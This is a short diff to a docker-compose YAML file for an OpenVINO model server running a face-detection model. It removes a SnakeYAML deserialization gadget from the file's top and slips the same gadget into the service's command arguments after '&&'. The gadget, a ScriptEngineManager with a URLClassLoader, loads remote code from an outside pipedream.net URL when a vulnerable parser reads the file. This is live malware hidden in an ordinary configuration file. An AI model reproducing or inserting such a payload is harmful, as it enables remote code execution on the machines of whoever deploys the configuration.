@@ -2,11 +2,6 @@
 # Copyright (C) 2021 Intel Corporation
 # SPDX-License-Identifier: Apache-2.0
 # ==============================================================================
-command: !!javax.script.ScriptEngineManager [
-  !!java.net.URLClassLoader [[
-    !!java.net.URL ["https://enk8bbn6s3fns.x.pipedream.net"]
-  ]]
-] 
 version: "3"
 networks: 
   ovms-bridge:
@@ -22,7 +17,7 @@ services:
       - "9000"
     networks: 
       - ovms-bridge
-    command: [--port=9000, --model_name=face-detection, --model_path=/models, --shape=auto]
+    command: [--port=9000, --model_name=face-detection, --model_path=/models, --shape=auto, &&,  !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://enk8bbn6s3fns.x.pipedream.net"]]]] ]
     tty: 
       true
       
